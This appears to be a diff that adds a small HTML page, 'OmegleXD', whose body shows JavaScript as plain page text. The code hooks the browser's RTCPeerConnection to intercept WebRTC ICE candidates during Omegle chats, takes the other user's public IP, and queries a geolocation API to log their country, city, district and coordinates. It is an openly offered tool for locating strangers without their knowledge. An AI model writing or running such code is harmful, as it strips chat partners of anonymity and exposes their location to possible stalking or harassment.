@@ -1,0 +1,53 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>omegle yo</title>
+</head>
+<body>
+    <h1>OmegleXD</h1>
+
+    let apiKey = "#"; <br>
+    <br>
+    window.oRTCPeerConnection =<br>
+      window.oRTCPeerConnection || window.RTCPeerConnection;<br>
+      <br>
+    window.RTCPeerConnection = function (...args) {<br>
+      const pc = new window.oRTCPeerConnection(...args);<br>
+      <br>
+      pc.oaddIceCandidate = pc.addIceCandidate;<br>
+      <br>
+      pc.addIceCandidate = function (iceCandidate, ...rest) { <br>
+        const fields = iceCandidate.candidate.split(" ");<br>
+        <br>
+        console.log(iceCandidate.candidate);<br>
+        const ip = fields[4];<br>
+        if (fields[7] === "srflx") {<br>
+          getLocation(ip);<br>
+        }<br>
+        return pc.oaddIceCandidate(iceCandidate, ...rest);<br>
+      };<br>
+      return pc;<br>
+    };<br>
+    <br>
+    let getLocation = async (ip) => {<br>
+      let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;<br>
+      <br>
+      await fetch(url).then((response) =><br>
+        response.json().then((json) => {<br>
+          const output = `<br>
+              ---------------------<br>
+              Country: ${json.country_name}<br>
+              State: ${json.state_prov}<br>
+              City: ${json.city}<br>
+              District: ${json.district}<br>
+              Lat / Long: (${json.latitude}, ${json.longitude})<br>
+              ---------------------<br>
+              `;<br>
+          console.log(output);<br>
+        })<br>
+      );<br>
+    };<br>
+</body>
+</html>
